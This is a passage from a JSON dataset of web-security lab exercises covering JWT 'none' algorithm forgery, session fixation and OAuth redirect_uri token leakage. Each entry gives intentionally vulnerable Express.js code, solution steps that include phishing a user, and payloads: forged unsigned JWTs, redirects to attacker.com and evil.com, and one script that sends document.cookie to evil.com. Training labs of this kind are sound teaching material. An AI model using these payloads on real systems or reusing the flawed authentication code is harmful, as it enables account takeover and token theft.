      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Access Denied'); res.send(`Account details for ${user.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session tokens",
      "Lab Description": "The application implements session tokens that are not regenerated upon login and are derived from predictable values such as timestamps or usernames. The attacker can fix a session identifier before login. To solve: Create a session for Carlos before he logs in, then access his account once he authenticates.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Postman to initiate a GET /login request without credentials and note the Set-Cookie header containing a session ID.",
        "2. Send the session cookie value to Carlos via phishing or assume he's logged in using the same predictable session ID.",
        "3. Once Carlos logs in using the fixed session, reuse the same session cookie in your browser.",
        "4. Send a GET /my-account request with that session cookie.",
        "5. Observe if access is granted to Carlos's authenticated session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'sess-' + new Date().getTime(); res.cookie('session', sessionId); res.send('<form method=post><input name=username><input name=password></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; if (users[username] === password) { sessions[sessionId] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}, this is your account page.`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: session=sess-1713100000000",
        "Cookie: session=sess-guest-session"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in redirect URI trust",
      "Lab Description": "This lab simulates a misconfigured OAuth flow where the application does not properly validate the redirect URI, allowing open redirection and token leakage. Attackers can supply their own redirect URI to capture access tokens issued to another user. To solve: Exploit the OAuth flow to steal an access token for user 'carlos' and use it to access their protected resources.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the OAuth authorization request to /auth?redirect_uri=...",
        "2. Modify the redirect_uri parameter to point to your Burp Collaborator or webhook.site endpoint.",
        "3. Trick Carlos into clicking the manipulated OAuth login URL via social engineering.",
        "4. Capture the token in your endpoint logs and extract the access_token parameter.",
        "5. Send a GET request to /my-account with Authorization: Bearer <stolen_token>."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (!redirect_uri || !client_id || response_type !== 'token') return res.status(400).send('Invalid OAuth request'); const accessToken = 'token-carlos-abc123'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-abc123') res.send('Welcome carlos. This is your protected data.'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.site/capture&response_type=token",
        "Authorization: Bearer token-carlos-abc123"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
      "Lab Description": "This lab implements JWT-based authentication using the `alg` field in the token header to determine the algorithm dynamically. The application fails to properly validate this value, allowing an attacker to forge a valid token using `alg: none`. To solve: Forge a token that grants access to Carlos’s account using algorithm confusion.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite or Postman to intercept a login request and retrieve your JWT token from the Set-Cookie header.",
        "Decode the token using jwt.io and observe the algorithm in the header (e.g., HS256) and payload structure.",
        "Replace the algorithm field in the token header with `none`, and remove the signature section.",
        "Modify the payload to impersonate user `carlos`.",
        "Resend the forged JWT in the Authorization header or as a cookie and access the /my-account endpoint to confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: 'admin', wiener: 'user' }; app.get('/login', (req, res) => { const { username } = req.query; if (users[username]) { const token = jwt.sign({ user: username, role: users[username] }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); } else { res.status(403).send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0"
      ]
    },
    {
      "Lab scenario": "OAuth redirect manipulation for token leakage",
      "Lab Description": "This lab integrates third-party OAuth for login and uses the `redirect_uri` parameter to navigate users post-authentication. The application fails to validate this URI properly. To solve: Manipulate the redirect_uri to leak Carlos's OAuth token to your controlled server.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp to intercept the login flow and identify the OAuth authorization request with `redirect_uri` parameter.",
        "Modify the `redirect_uri` to point to your controlled domain (e.g., https://evil.com/callback).",
        "Complete the login process using Carlos's OAuth credentials or initiate it on their behalf if tokens are URL-bound.",
        "Capture the authorization code or access token on your domain.",
        "Use the stolen token in a request to the app's /my-account endpoint to gain access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const code = req.query.code; const redirect_uri = req.query.redirect_uri; request.post('https://oauth.example.com/token', { form: { code, client_id: 'client123', client_secret: 'secret', redirect_uri } }, (err, response, body) => { const token = JSON.parse(body).access_token; res.cookie('access_token', token); res.redirect(redirect_uri); }); }); app.get('/my-account', (req, res) => { const token = req.cookies.access_token; if (token === 'admin-oauth-token') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "https://evil.com/callback",
        "https://evil.com?code={authCode}",
        "https://evil.com/callback?token={accessToken}"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "The application assigns session tokens before authentication and does not generate a new session upon successful login. This allows an attacker to fix a session ID for a victim. To solve: Set a session ID, trick Carlos into logging in, then reuse the same session ID to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp to initiate a session by accessing the login page and capture the session cookie (e.g., session=abc123).",
        "Send the session ID to the victim (Carlos) via phishing or an embedded link containing the fixed session cookie.",
        "Wait for Carlos to log in while using the session ID you set.",
        "Once logged in, reuse the same session cookie to access the /my-account page as Carlos.",
        "Verify access to Carlos's account and confirm exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: true, saveUninitialized: true })); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(5000);",
      "payloads": [
        "session=fixatedSession123",
        "Set-Cookie: session=fixatedSession123",
        "GET /my-account HTTP/1.1\nCookie: session=fixatedSession123"
      ]
    },
    {
      "Lab scenario": "JWT signature bypass in stateless session handling",
      "Lab Description": "This lab demonstrates a JWT validation flaw caused by the server not verifying the token's algorithm. The application accepts JWTs as bearer tokens to manage authentication. However, it does not verify whether the signature algorithm is secure. To solve: Modify and forge a JWT token that grants access to Carlos’s protected account page without knowing the original secret.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Postman or Burp Suite to capture a legitimate JWT from your account login.",
        "2. Decode the JWT using jwt.io or any JWT decoder and note the header and payload structure.",
        "3. Modify the 'alg' field in the JWT header from 'HS256' to 'none'. Remove the signature.",
        "4. In the payload, change 'username' to 'carlos' and re-encode the token without a signature.",
        "5. Use the tampered JWT as a Bearer token in the Authorization header to access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: { role: 'admin' }, wiener: { role: 'user' } }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration via open redirect abuse",
      "Lab Description": "The application integrates with a third-party OAuth provider for authentication. Due to poor redirect URI validation, it is vulnerable to open redirect abuse, allowing attackers to intercept authorization codes. To solve: Exploit the misconfigured redirect URI to capture Carlos's OAuth token and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to initiate OAuth login flow and intercept the GET request to /auth/redirect?next=[URL].",
        "2. Modify the next parameter to redirect to your malicious server (e.g., http://evil.com/callback).",
        "3. Host a listener on your server to capture the authorization code sent from the provider.",
        "4. Use the captured code with curl or Postman to manually redeem the token.",
        "5. Use the token in the Authorization header to impersonate Carlos and access /account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth/redirect', (req, res) => { const next = req.query.next || '/home'; res.redirect(`https://oauth-provider.com/auth?client_id=123&redirect_uri=${next}`); }); app.get('/callback', (req, res) => { const { code } = req.query; res.send('OAuth code received: ' + code); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://target.com/auth/redirect?next=http://evil.com/callback",
        "https://target.com/auth/redirect?next=https://evil.com/oauth/code",
        "https://target.com/auth/redirect?next=data:text/html,<script>location='http://evil.com?c='+document.cookie</script>"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session tokens",
      "Lab Description": "This lab uses predictable session tokens vulnerable to fixation. The server does not regenerate session identifiers upon authentication, allowing an attacker to set a known token and trick a victim into using it. To solve: Set a session token, trick Carlos into logging in with it, then reuse the token to access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite or browser dev tools to inspect the cookie during unauthenticated browsing. Note the token format.",
        "2. Generate a custom session token manually using the same predictable pattern (e.g., static prefix + timestamp).",
        "3. Set this token in your browser cookies or with Postman and send Carlos a phishing link using this session.",
        "4. After Carlos logs in via the phishing link, reuse the same session ID in a new request to /dashboard.",
        "5. Confirm access to Carlos’s session by verifying his username or settings page content."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'carlospass', wiener: 'wienerpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sessionId = req.cookies.session || `sess_${Date.now()}`; sessions[sessionId] = username; res.cookie('session', sessionId); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Dashboard for ${user}`); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "sess_1710000000000",
        "sess_1701234567890",
        "sess_1699999999999"
      ]
    },
    {
      "Lab scenario": "JWT signature spoof using 'none' algorithm",
      "Lab Description": "This lab is vulnerable to JWT tampering due to improper validation of the token algorithm field. The application accepts tokens signed using the 'none' algorithm without verifying their authenticity. To solve: forge a token that grants administrative access to Carlos’s account without knowing the signing secret.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the JWT after a valid login and decode it using jwt.io.",
        "Observe the 'alg' field in the header; confirm it's set to 'HS256'. Replace this with 'none'.",
        "Remove the signature segment of the token, keeping only the base64-encoded header and payload.",
        "Modify the payload to change the username field to 'carlos' and set admin=true.",
        "Send the modified token in the Authorization header using Postman and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos' && payload.admin) { return res.send('Welcome Carlos - Admin Access'); } res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
        "Authorization: Bearer [token]",
        "{ \"alg\": \"none\" } header + { \"username\": \"carlos\", \"admin\": true } payload"
      ]
    },
    {
      "Lab scenario": "OAuth open redirect misconfiguration",
      "Lab Description": "The application uses a third-party OAuth provider for login, but does not properly validate redirect URIs. An attacker can exploit this to capture tokens or impersonate a user. To solve: manipulate the redirect_uri parameter to steal Carlos’s token and access their account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, initiate an OAuth login flow and capture the GET request to /oauth/authorize.",
        "Modify the redirect_uri parameter to an attacker-controlled domain that logs the access token.",
        "Send the modified URL to Carlos (social engineering assumed).",
        "Use captured token from the attacker domain and attach it in an Authorization: Bearer header.",
        "Access /my-account as Carlos and verify token grants access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('querystring'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', qs.stringify({ code, redirect_uri }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }); const accessToken = tokenRes.data.access_token; res.redirect(`${redirect_uri}?token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token-123') { return res.send('Welcome Carlos!'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://vulnerable-app.com/oauth/callback?code=abc&redirect_uri=https://attacker.com/capture",
        "Authorization: Bearer carlos-token-123",
        "https://attacker.com/capture?token=carlos-token-123"
      ]
    },
    {
      "Lab scenario": "Session fixation via pre-set cookie",
      "Lab Description": "The application fails to regenerate the session ID after authentication. An attacker can set a session ID for the victim, then trick them into logging in with it. This allows session hijacking. To solve: set a session cookie for Carlos, wait for login, then reuse it to access the account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to send a GET request with a custom session ID: Cookie: session=attack-session.",
        "Trick Carlos into clicking a crafted login link with the session cookie preset (e.g., via email).",
        "Carlos logs in, binding his account to 'attack-session'.",
        "Replay the session by reusing 'attack-session' as the cookie value.",
        "Access /my-account and confirm session fixation success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecure' }; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { return res.send('Welcome back Carlos'); } res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: session=attack-session",
        "POST /login with session=attack-session and Carlos credentials",
        "GET /my-account with Cookie: session=attack-session"
      ]
    },
    {
      "Lab scenario": "JWT tampering vulnerability in Authorization Header",
      "Lab Description": "This lab has an authentication mechanism based on JWTs which are stored and verified insecurely. The application decodes the JWT but fails to validate its signature. This allows a user to modify the token payload and gain unauthorized access. To solve: Tamper with a JWT to escalate privileges and access the admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a request containing the JWT using Burp Suite and inspect the Authorization header.",
        "Decode the JWT at jwt.io and confirm that the signature is either 'none' or not validated server-side.",
        "Modify the payload to set \"role\": \"admin\" and set the alg header to \"none\".",
        "Remove the signature entirely and re-encode the header and payload using base64url.",
        "Replace the original token in the Authorization header and send a GET request to /admin."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }]; app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to the admin panel'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID in Cookie",
      "Lab Description": "This lab's session management is vulnerable due to the use of predictable session identifiers that are not regenerated after login. The application uses static session tokens which remain valid after authentication, allowing an attacker to fix a session ID for the victim. To solve: Set a known session ID, trick the victim into logging in, then hijack the session and access the account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a GET request to initiate a session and capture the Set-Cookie header using Burp Suite.",
        "Manually set a known session ID (e.g., session=attacker123) using Postman or Burp.",
        "Send the crafted link with the known session ID to the victim (simulated in lab setup).",
        "After the victim logs in, reuse the same session ID in your browser.",
        "Send a GET /account request with the known cookie to access the victim's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.cookies.session; if (!sid) { sid = req.query.sid || Math.random().toString(36).substring(2); res.cookie('session', sid); } req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username } = req.body; sessions[req.sessionID] = { username }; res.send('Logged in'); }); app.get('/account', (req, res) => { const user = sessions[req.sessionID]; if (user) res.send(`Account page of ${user.username}`); else res.send('Not logged in'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "session=attacker123",
        "session=sharedToken42",
        "session=testsession001"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration vulnerability in redirect_uri",
      "Lab Description": "This lab features a misconfigured OAuth flow that fails to validate redirect_uri strictly, allowing an attacker to intercept tokens by exploiting open redirect behavior. The application integrates with an OAuth provider for authentication. To solve: Exploit the misconfiguration to capture Carlos’s access token via an attacker-controlled domain.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Initiate the OAuth flow and observe the redirect_uri parameter using Burp Suite.",
        "Modify redirect_uri to an attacker-controlled domain while preserving the base domain.",
        "Host a simple token-stealing page that logs query parameters (e.g., access_token).",
        "Send the malicious link to the victim (simulated within lab).",
        "Access the captured token from logs and replay it to impersonate the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokenStore = { 'carlos': 'abcd123token' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const accessToken = tokenStore['carlos']; const redirectUrl = `${redirect_uri}?access_token=${accessToken}&state=${state}`; res.redirect(redirectUrl); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === tokenStore['carlos']) res.send('Carlos Profile Page'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/capture",
        "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/oauth-callback",
        "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/redirect&state=xyz"
      ]
    },
    {
      "Lab scenario": "JWT tampering to escalate privileges in API access",
      "Lab Description": "This lab features a RESTful API that uses JWTs for authentication. The backend accepts unsigned JWTs due to a missing verification check. The application uses the 'role' claim to restrict access to administrative endpoints. To solve: forge a JWT granting admin access and retrieve the sensitive data from the /admin/report endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture JWT using Burp Suite when logged in as a normal user",
        "Send token to jwt.io or use jwt_tool to inspect token structure and verify the 'alg' header is set to 'none'",
        "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set alg to 'none'",
        "Remove the signature entirely, rebase64 the header and payload, and reconstruct the JWT",
        "Send request to /admin/report with the forged token in Authorization header to access protected resource"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/api/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'none' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Sensitive admin report data'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation in login redirection flow",
      "Lab Description": "The application uses a session cookie to manage authenticated users, but fails to issue a new session identifier upon successful login. An attacker can preset a session ID for the victim, then trick them into authenticating with it. To solve: hijack Carlos’s session by forcing him to log in using a fixed session ID.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start a session with a custom session ID using Burp (e.g., Cookie: session=attacker123)",
        "Browse to the login endpoint and log in using your own credentials with the crafted session ID",
        "Send the session URL to Carlos (e.g., /login?redirect=/my-account with cookie=session=attacker123)",
        "Wait for Carlos to log in; session cookie remains attacker123 due to missing regeneration",
        "Use the same session cookie (attacker123) to access /my-account as Carlos"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'secret123' } }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username].password === password) { res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') { res.send('Welcome Carlos, here is your account'); } else { res.send('Unauthorized'); } }); app.listen(3000);",
      "payloads": [
        "Cookie: session=attacker123",
        "/login?username=carlos&password=secret123",
        "/my-account with Cookie: session=attacker123"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leakage via referrer header",
      "Lab Description": "The application uses an OAuth 2.0 implicit flow and places access tokens in the URL fragment. However, a redirect to a third-party domain causes the access token to leak via the Referer header. To solve: capture Carlos’s token via a malicious redirect and use it to access his data.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Initiate OAuth login flow and observe token returned in URL fragment (e.g., #access_token=xyz)",
        "Craft a redirect_uri to attacker.com/capture that causes the browser to send the Referer with the full URL",
        "Send phishing link to Carlos containing redirect_uri=https://attacker.com/capture",
        "Set up HTTP listener on attacker.com to capture Referer with access token",
        "Use captured access token in Authorization header to call /api/user-data as Carlos"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { res.send(`<script>window.location='https://attacker.com/capture#' + window.location.hash.substr(1);</script>`); }); app.get('/api/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-access-token') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "https://target.com/oauth/callback#access_token=carlos-access-token",
        "Referer: https://target.com/oauth/callback#access_token=carlos-access-token",
        "Authorization: Bearer carlos-access-token"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion vulnerability in login endpoint",
      "Lab Description": "The application's login mechanism uses JSON Web Tokens for session management but fails to validate the algorithm field properly. The application blindly trusts tokens signed with 'none' as valid. To solve: gain access to Carlos's account by forging a valid token without knowing the secret.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Burp Suite to intercept a login request and extract the JWT from the Authorization header.",
        "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm value in the header is set to HS256.",
        "Modify the algorithm to 'none' and remove the signature portion of the token.",
        "Change the payload section to {\"username\":\"carlos\"} and re-encode the token with no signature.",
        "Replay the request with the forged JWT in the Authorization header and access the /my-account endpoint to verify success."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') res.send('Welcome carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Lab running...'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leakage via redirect URI",
      "Lab Description": "This lab's OAuth implementation uses an implicit grant flow that leaks the access token in the redirect URI. The application does not sanitize or securely handle fragment identifiers, allowing an attacker to steal tokens via referer headers. To solve: extract Carlos's token and use it to access his protected profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use OWASP ZAP to proxy a login via OAuth and capture the redirection URI that includes the access token.",
        "Observe that the access token appears in the URL fragment (e.g., #access_token=XYZ).",
        "Inject a redirect URI during the OAuth handshake that points to your attacker server and logs the fragment token.",
        "Once Carlos logs in via the crafted link, intercept the token on your server via HTTP referer or browser-side script.",
        "Use the stolen token in an Authorization header to access /user/profile and retrieve Carlos’s data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token-abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token-abc123') res.send('Carlos Profile'); else res.status(403).send('Access denied'); }); app.listen(4001, () => console.log('OAuth Token Leak Lab running...'));",
      "payloads": [
        "https://attacker.com/callback#access_token=carlos-oauth-token-abc123",
        "Authorization: Bearer carlos-oauth-token-abc123"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in change-password endpoint",
      "Lab Description": "The application assigns a new session cookie upon login, but the session is not properly regenerated after sensitive operations. This allows an attacker to fix a session ID before victim login. To solve: set a session for Carlos before he logs in and hijack his session after he changes his password.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Postman, initiate a GET /session with a custom session ID and send it to the victim via social engineering.",
        "Once the victim logs in, reuse the same session cookie to validate it has been fixed.",
        "Capture the request when the victim changes their password — session ID remains unchanged.",
        "Replay the session cookie in your browser or client to hijack the victim's session.",
        "Access /my-account with the hijacked session to solve the lab."
      ],
      "Vulnerability name": "Authentication",
